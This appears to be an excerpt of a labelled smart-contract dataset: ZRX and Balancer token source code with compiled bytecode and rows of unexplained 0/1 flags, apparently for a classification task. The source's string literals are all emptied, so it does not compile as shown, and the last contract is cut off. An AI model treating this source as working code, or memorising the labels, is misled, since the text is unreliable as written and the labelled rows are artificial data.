526101428501808352815191840191909120939052610162840180825283905260ff88166101828501526101a284018790526101c284018690525191926001926101e28083019392601f198301929081900390910190855afa1580156119a2573d6000803e3d6000fd5b505050602060405103516001600160a01b0316896001600160a01b031614611a05576040805162461bcd60e51b8152602060048201526011602482015270494e56414c49445f5349474e415455524560781b604482015290519081900360640190fd5b611a10826001611f10565b6001600160a01b038a166000908152600660205260409020556117a9898989611fb0565b610cf2338383612304565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b7f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f81565b604051806040016040528060018152602001603160f81b81525081565b600c602052600090815260409020546001600160a01b031681565b611ace611fac565b60055461010090046001600160a01b03908116911614611b23576040805162461bcd60e51b81526020600482018190526024820152600080516020612d54833981519152604482015290519081900360640190fd5b6001600160a01b038116611b685760405162461bcd60e51b8152600401808060200182810382526026815260200180612c9d6026913960400191505060405180910390fd5b6005546040516001600160a01b0380841692610100900416907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b60007f10d8d059343739efce7dad10d09f0806da52b252b3e6a7951920d2d6ec4102e588886001811115611bff57fe5b604080516020808201959095526001600160a01b039093168382015260608301919091526080820189905260a08083018990528151808403909101815260c08301825280519084012061190160f01b60e08401527f17e76dd75f3dfe3e50d31322433cc1405e898404a5724da2d4804cab81e0a88a60e2840152610102808401829052825180850390910181526101228401808452815191860191909120600091829052610142850180855281905260ff8a1661016286015261018285018990526101a285018890529251919550919391926001926101c2808301939192601f198301929081900390910190855afa158015611cff573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116611d5b576040805162461bcd60e51b8152602060048201526011602482015270494e56414c49445f5349474e415455524560781b604482015290519081900360640190fd5b6001600160a01b03811660009081526006602052604090208054600181019091558814611dbf576040805162461bcd60e51b815260206004820152600d60248201526c494e56414c49445f4e4f4e434560981b604482015290519081900360640190fd5b86421115611e09576040805162461bcd60e51b815260206004820152601260248201527124a72b20a624a22fa2ac2824a920aa24a7a760711b604482015290519081900360640190fd5b611e14818b8b612304565b50505050505050505050565b6001600160a01b038216611e7b576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b611e8760008383612740565b600254611e949082611f10565b6002556001600160a01b038216600090815260208190526040902054611eba9082611f10565b6001600160a01b0383166000818152602081815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b600082820183811015611354576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b600061135483836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061247a565b3390565b6001600160a01b038316611ff55760405162461bcd60e51b8152600401808060200182810382526024815260200180612dbd6024913960400191505060405180910390fd5b6001600160a01b03821661203a5760405162461bcd60e51b8152600401808060200182810382526022815260200180612cc36022913960400191505060405180910390fd5b6001600160a01b03808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b7f000000000000000000000000000000000000000000000000000000006145fef0421080156120cc575060115442105b15610cf2576001600160a01b0382166000908152600f602052604090205460ff168061211057506001600160a01b0381166000908152600f602052604090205460ff165b610cf2576040805162461bcd60e51b815260206004820181905260248201527f4e4f4e5f414c4c4f574c4953545f5452414e53464552535f44495341424c4544604482015290519081900360640190fd5b600061216e84848461279f565b6121d98461217a611fac565b610ba885604051806060016040528060288152602001612d2c602891396001600160a01b038a166000908152600160205260408120906121b8611fac565b6001600160a01b03168152602081019190915260400160002054919061247a565b5060019392505050565b6000826121f257506000610a9c565b828202828482816121ff57fe5b04146113545760405162461bcd60e51b8152600401808060200182810382526021815260200180612d0b6021913960400191505060405180910390fd5b600061135483836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506128fa565b6122888282611e20565b600e54436000612296610ac8565b6040805180820182526001600160801b03808616825280841660208084019182526000898152600d909152939093209151825493518216600160801b029082166001600160801b0319909416939093171691909117905590506122fa836001611f10565b600e555050505050565b6001600160a01b038216612353576040805162461bcd60e51b8152602060048201526011602482015270494e56414c49445f44454c45474154454560781b604482015290519081900360640190fd5b600061235e82612415565b92505050600061236d85610e1f565b9050600061237b868461244f565b6001600160a01b03878116600090815260208690526040902080546001600160a01b03191691881691909117905590506123b78186848761295f565b846001600160a01b0316866001600160a01b03167fe8d51c8e11bd570db1734c8ec775785330e77007feed45c43b608ef33ff914bd86604051808260018111156123fd57fe5b815260200191505060405180910390a3505050505050565b600080808084600181111561242657fe5b141561243c575060079150600890506009612448565b50600a9150600b9050600c5b9193909250565b6001600160a01b03808316600090815260208390526040812054909116806113545783915050610a9c565b600081848411156125095760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156124ce5781810151838201526020016124b6565b50505050905090810190601f1680156124fb5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b6000610a9861251e611fac565b848461279f565b600043821115612573576040805162461bcd60e51b815260206004820152601460248201527324a72b20a624a22fa12627a1a5afa72aa6a122a960611b604482015290519081900360640190fd5b6001600160a01b038316600090815260208590526040902054806125a25761259a84610e1f565b915050610aeb565b6001600160a01b038416600090815260208781526040808320600019850184529091529020546001600160801b03168310612615576001600160a01b038416600090815260208781526040808320600019909401835292905220546001600160801b03600160801b909104169050610aeb565b6001600160a01b0384166000908152602087815260408083208380529091529020546001600160801b0316831015612651576000915050610aeb565b600060001982015b81811115612703576002828203048103612671612c62565b506001600160a01b038716600090815260208a815260408083208484528252918290208251808401909352546001600160801b03808216808552600160801b90920416918301919091528714156126db57602001516001600160801b03169450610aeb9350505050565b80516001600160801b03168711156126f5578193506126fc565b6001820392505b5050612659565b506001600160a01b0385166000908152602088815260408083209383529290522054600160801b90046001600160801b0316915050949350505050565b600061274d84600961244f565b9050600061275c84600961244f565b905061276b828285600061295f565b600061277886600c61244f565b9050600061278786600c61244f565b9050612796828287600161295f565b50505050505050565b6001600160a01b0383166127e45760405162461bcd60e51b8152600401808060200182810382526025815260200180612d746025913960400191505060405180910390fd5b6001600160a01b0382166128295760405162461bcd60e51b8152600401808060200182810382526023815260200180612c7a6023913960400191505060405180910390fd5b612834838383612740565b61287181604051806060016040528060268152602001612ce5602691396001600160a01b038616600090815260208190526040902054919061247a565b6001600160a01b0380851660009081526020819052604080822093909355908416815220546128a09082611f10565b6001600160a01b038084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b600081836129495760405162461bcd60e51b81526020600482018181528351602484015283519092839260449091019190850190808383600083156124ce5781810151838201526020016124b6565b50600083858161295557fe5b0495945050505050565b826001600160a01b0316846001600160a01b0316141561297e57612b65565b60008061298a83612415565b5090925090506001600160a01b03861615612a79576001600160a01b03861660009081526020829052604081205480156129fb576001600160a01b03881660009081526020858152604080832060001985018452909152902054600160801b90046001600160801b03169150612a07565b612a0488610e1f565b91505b6000612a138388611f6a565b9050612a2185858b84612b6b565b886001600160a01b03167fa0a19463ee116110c9b282012d9b65cc5522dc38a9520340cbaf3142e550127f828860405180838152602001826001811115612a6457fe5b81526020019250505060405180910390a25050505b6001600160a01b03851615612b62576001600160a01b0385166000908152602082905260408120548015612ae4576001600160a01b03871660009081526020858152604080832060001985018452909152902054600160801b90046001600160801b03169150612af0565b612aed87610e1f565b91505b6000612afc8388611f10565b9050612b0a85858a84612b6b565b876001600160a01b03167fa0a19463ee116110c9b282012d9b65cc5522dc38a9520340cbaf3142e550127f828860405180838152602001826001811115612b4d57fe5b81526020019250505060405180910390a25050505b50505b50505050565b6001600160a01b03821660009081526020848152604080832054918790529091204391908115801590612bbc575060001982016000908152602082905260409020546001600160801b038481169116145b15612bf1576000198201600090815260208290526040902080546001600160801b03808716600160801b029116179055612796565b6040805180820182526001600160801b039485168152948416602080870191825260008581529381528284209651875492518716600160801b029087166001600160801b031990931692909217909516179094556001600160a01b0394909416845293905290206001909101905550565b60408051808201909152600080825260208201529056fe45524332303a207472616e7366657220746f20746865207a65726f20616464726573734f776e61626c653a206e6577206f776e657220697320746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e6365536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63654f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657245524332303a207472616e736665722066726f6d20746865207a65726f2061646472657373414444524553535f4558495354535f494e5f5452414e534645525f414c4c4f574c49535445524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373414444524553535f444f45535f4e4f545f45584953545f494e5f5452414e534645525f414c4c4f574c4953544e45575f5452414e534645525f5245535452494354494f4e5f544f4f5f4541524c5945524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa26469706673582212201bc2d69deb253172a3e0761bf351bf8b317e0b6377e62b43a4510998861cbcf664736f6c63430007050033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity 0.4.11;contract Token { function totalSupply() constant returns (uint supply) {} function balanceOf(address _owner) constant returns (uint balance) {} function transfer(address _to, uint _value) returns (bool success) {} function transferFrom(address _from, address _to, uint _value) returns (bool success) {} function approve(address _spender, uint _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint remaining) {} event Transfer(address indexed _from, address indexed _to, uint _value); event Approval(address indexed _owner, address indexed _spender, uint _value);}contract StandardToken is Token { function transfer(address _to, uint _value) returns (bool) { if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint _value) returns (bool) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint) { return balances[_owner]; } function approve(address _spender, uint _value) returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint) { return allowed[_owner][_spender]; } mapping (address => uint) balances; mapping (address => mapping (address => uint)) allowed; uint public totalSupply;}contract UnlimitedAllowanceToken is StandardToken { uint constant MAX_UINT = 2**256 - 1; function transferFrom(address _from, address _to, uint _value) public returns (bool) { uint allowance = allowed[_from][msg.sender]; if (balances[_from] >= _value && allowance >= _value && balances[_to] + _value >= balances[_to] ) { balances[_to] += _value; balances[_from] -= _value; if (allowance < MAX_UINT) { allowed[_from][msg.sender] -= _value; } Transfer(_from, _to, _value); return true; } else { return false; } }}contract ZRXToken is UnlimitedAllowanceToken { uint8 constant public decimals = 18; uint public totalSupply = 10**27; string constant public name = ; string constant public symbol = ; function ZRXToken() { balances[msg.sender] = totalSupply; }}",0x60606040523615610097576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610099578063095ea7b31461013257806318160ddd1461018957806323b872dd146101af578063313ce5671461022557806370a082311461025157806395d89b411461029b578063a9059cbb14610334578063dd62ed3e1461038b575bfe5b34156100a157fe5b6100a96103f4565b60405180806020018281038252838181518152602001915080519060200190808383600083146100f8575b8051825260208311156100f8576020820191506020810190506020830392506100d4565b505050905090810190601f1680156101245780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561013a57fe5b61016f600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061042e565b604051808215151515815260200191505060405180910390f35b341561019157fe5b610199610521565b6040518082815260200191505060405180910390f35b34156101b757fe5b61020b600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610527565b604051808215151515815260200191505060405180910390f35b341561022d57fe5b610235610857565b604051808260ff1660ff16815260200191505060405180910390f35b341561025957fe5b610285600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061085c565b6040518082815260200191505060405180910390f35b34156102a357fe5b6102ab6108a6565b60405180806020018281038252838181518152602001915080519060200190808383600083146102fa575b8051825260208311156102fa576020820191506020810190506020830392506102d6565b505050905090810190601f1680156103265780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561033c57fe5b610371600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506108e0565b604051808215151515815260200191505060405180910390f35b341561039357fe5b6103de600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610ace565b6040518082815260200191505060405180910390f35b604060405190810160405280601181526020017f30782050726f746f636f6c20546f6b656e00000000000000000000000000000081525081565b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a3600190505b92915050565b60035481565b60006000600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905082600060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156105f95750828110155b80156106855750600060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483600060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110155b156108455782600060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555082600060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8110156107d75782600160008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b8373ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040518082815260200191505060405180910390a36001915061084f565b6000915061084f565b5b509392505050565b601281565b6000600060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490505b919050565b604060405190810160405280600381526020017f5a5258000000000000000000000000000000000000000000000000000000000081525081565b600081600060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156109b15750600060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482600060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110155b15610abe5781600060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a360019050610ac8565b60009050610ac8565b5b92915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490505b929150505600a165627a7a72305820d31ec12b6fe4e3204b5bdd3a3cafc924f0101471e7aa3e9460b81496e9067ec70029,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.6.0;library EnumerableSet { struct Set { bytes32[] _values; mapping (bytes32 => uint256) _indexes; } function _add(Set storage set, bytes32 value) private returns (bool) { if (!_contains(set, value)) { set._values.push(value); set._indexes[value] = set._values.length; return true; } else { return false; } } function _remove(Set storage set, bytes32 value) private returns (bool) { uint256 valueIndex = set._indexes[value]; if (valueIndex != 0) { uint256 toDeleteIndex = valueIndex - 1; uint256 lastIndex = set._values.length - 1; bytes32 lastvalue = set._values[lastIndex]; set._values[toDeleteIndex] = lastvalue; set._indexes[lastvalue] = toDeleteIndex + 1; set._values.pop(); delete set._indexes[value]; return true; } else { return false; } } function _contains(Set storage set, bytes32 value) private view returns (bool) { return set._indexes[value] != 0; } function _length(Set storage set) private view returns (uint256) { return set._values.length; } function _at(Set storage set, uint256 index) private view returns (bytes32) { require(set._values.length > index, ); return set._values[index]; } struct AddressSet { Set _inner; } function add(AddressSet storage set, address value) internal returns (bool) { return _add(set._inner, bytes32(uint256(value))); } function remove(AddressSet storage set, address value) internal returns (bool) { return _remove(set._inner, bytes32(uint256(value))); } function contains(AddressSet storage set, address value) internal view returns (bool) { return _contains(set._inner, bytes32(uint256(value))); } function length(AddressSet storage set) internal view returns (uint256) { return _length(set._inner); } function at(AddressSet storage set, uint256 index) internal view returns (address) { return address(uint256(_at(set._inner, index))); } struct UintSet { Set _inner; } function add(UintSet storage set, uint256 value) internal returns (bool) { return _add(set._inner, bytes32(value)); } function remove(UintSet storage set, uint256 value) internal returns (bool) { return _remove(set._inner, bytes32(value)); } function contains(UintSet storage set, uint256 value) internal view returns (bool) { return _contains(set._inner, bytes32(value)); } function length(UintSet storage set) internal view returns (uint256) { return _length(set._inner); } function at(UintSet storage set, uint256 index) internal view returns (uint256) { return uint256(_at(set._inner, index)); }}pragma solidity ^0.6.2;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= amount, ); (bool success, ) = recipient.call{ value: amount }(); require(success, ); }}pragma solidity ^0.6.0;contract Context { constructor () internal { } function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity ^0.6.0;abstract contract AccessControl is Context { using EnumerableSet for EnumerableSet.AddressSet; using Address for address; struct RoleData { EnumerableSet.AddressSet members; bytes32 adminRole; } mapping (bytes32 => RoleData) private _roles; bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00; event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender); event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender); function hasRole(bytes32 role, address account) public view returns (bool) { return _roles[role].members.contains(account); } function getRoleMemberCount(bytes32 role) public view returns (uint256) { return _roles[role].members.length(); } function getRoleMember(bytes32 role, uint256 index) public view returns (address) { return _roles[role].members.at(index); } function getRoleAdmin(bytes32 role) public view returns (bytes32) { return _roles[role].adminRole; } function grantRole(bytes32 role, address account) public virtual { require(hasRole(_roles[role].adminRole, _msgSender()), ); _grantRole(role, account); } function revokeRole(bytes32 role, address account) public virtual { require(hasRole(_roles[role].adminRole, _msgSender()), ); _revokeRole(role, account); } function renounceRole(bytes32 role, address account) public virtual { require(account == _msgSender(), ); _revokeRole(role, account); } function _setupRole(bytes32 role, address account) internal virtual { _grantRole(role, account); } function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual { _roles[role].adminRole = adminRole; } function _grantRole(bytes32 role, address account) private { if (_roles[role].members.add(account)) { emit RoleGranted(role, account, _msgSender()); } } function _revokeRole(bytes32 role, address account) private { if (_roles[role].members.remove(account)) { emit RoleRevoked(role, account, _msgSender()); } }}pragma solidity ^0.6.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.6.0;library Math { function max(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a : b; } function min(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; } function average(uint256 a, uint256 b) internal pure returns (uint256) { return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2); }}pragma solidity ^0.6.0;library Arrays { function findUpperBound(uint256[] storage array, uint256 element) internal view returns (uint256) { if (array.length == 0) { return 0; } uint256 low = 0; uint256 high = array.length; while (low < high) { uint256 mid = Math.average(low, high); if (array[mid] > element) { high = mid; } else { low = mid + 1; } } if (low > 0 && array[low - 1] == element) { return low - 1; } else { return low; } }}pragma solidity ^0.6.0;library Counters { using SafeMath for uint256; struct Counter { uint256 _value; } function current(Counter storage counter) internal view returns (uint256) { return counter._value; } function increment(Counter storage counter) internal { counter._value += 1; } function decrement(Counter storage counter) internal { counter._value = counter._value.sub(1); }}pragma solidity ^0.6.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.6.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; using Address for address; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol) public { _name = name; _symbol = symbol; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity ^0.6.0;abstract contract ERC20Snapshot is ERC20 { using SafeMath for uint256; using Arrays for uint256[]; using Counters for Counters.Counter; struct Snapshots { uint256[] ids; uint256[] values; } mapping (address => Snapshots) private _accountBalanceSnapshots; Snapshots private _totalSupplySnapshots; Counters.Counter private _currentSnapshotId; event Snapshot(uint256 id); function _snapshot() internal virtual returns (uint256) { _currentSnapshotId.increment(); uint256 currentId = _currentSnapshotId.current(); emit Snapshot(currentId); return currentId; } function balanceOfAt(address account, uint256 snapshotId) public view returns (uint256) { (bool snapshotted, uint256 value) = _valueAt(snapshotId, _accountBalanceSnapshots[account]); return snapshotted ? value : balanceOf(account); } function totalSupplyAt(uint256 snapshotId) public view returns(uint256) { (bool snapshotted, uint256 value) = _valueAt(snapshotId, _totalSupplySnapshots); return snapshotted ? value : totalSupply(); } function _transfer(address from, address to, uint256 value) internal virtual override { _updateAccountSnapshot(from); _updateAccountSnapshot(to); super._transfer(from, to, value); } function _mint(address account, uint256 value) internal virtual override { _updateAccountSnapshot(account); _updateTotalSupplySnapshot(); super._mint(account, value); } function _burn(address account, uint256 value) internal virtual override { _updateAccountSnapshot(account); _updateTotalSupplySnapshot(); super._burn(account, value); } function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) { require(snapshotId > 0, ); require(snapshotId <= _currentSnapshotId.current(), ); uint256 index = snapshots.ids.findUpperBound(snapshotId); if (index == snapshots.ids.length) { return (false, 0); } else { return (true, snapshots.values[index]); } } function _updateAccountSnapshot(address account) private { _updateSnapshot(_accountBalanceSnapshots[account], balanceOf(account)); } function _updateTotalSupplySnapshot() private { _updateSnapshot(_totalSupplySnapshots, totalSupply()); } function _updateSnapshot(Snapshots storage snapshots, uint256 currentValue) private { uint256 currentId = _currentSnapshotId.current(); if (_lastSnapshotId(snapshots.ids) < currentId) { snapshots.ids.push(currentId); snapshots.values.push(currentValue); } } function _lastSnapshotId(uint256[] storage ids) private view returns (uint256) { if (ids.length == 0) { return 0; } else { return ids[ids.length - 1]; } }}pragma solidity =0.6.8;contract BalancerGovernanceToken is AccessControl, ERC20Snapshot { string public constant version = ; bytes32 public constant MINTER_ROLE = keccak256(); bytes32 public constant SNAPSHOT_ROLE = keccak256(); bytes32 public immutable DOMAIN_SEPARATOR; bytes32 public immutable PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; mapping(address => uint) public nonces; constructor(string memory name, string memory symbol) public ERC20(name, symbol) { _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); _setupRole(MINTER_ROLE, _msgSender()); _setupRole(SNAPSHOT_ROLE, _msgSender()); uint256 chainId = _chainID(); DOMAIN_SEPARATOR = keccak256( abi.encode( keccak256(), keccak256(bytes(name)), keccak256(bytes(version)), chainId, address(this) ) ); } function _chainID() private pure returns (uint256) { uint256 chainID; assembly { chainID := chainid() } return chainID; } function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external { require(block.timestamp <= deadline, ); bytes32 digest = keccak256( abi.encodePacked( uint16(0x1901), DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)) ) ); require(owner == _recover(digest, v, r, s), ); _approve(owner, spender, value); } function _recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) private pure returns (address) { if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) { revert(); } if (v != 27 && v != 28) { revert(); } address signer = ecrecover(hash, v, r, s); require(signer != address(0), ); return signer; } function mint(address to, uint256 amount) public virtual { require(hasRole(MINTER_ROLE, _msgSender()), ); _mint(to, amount); } function burn(uint256 amount) public virtual { _burn(_msgSender(), amount); } function burnFrom(address account, uint256 amount) public virtual { uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, ); _approve(account, _msgSender(), decreasedAllowance); _burn(account, amount); } function snapshot() public virtual { require(hasRole(SNAPSHOT_ROLE, _msgSender()), ); _snapshot(); 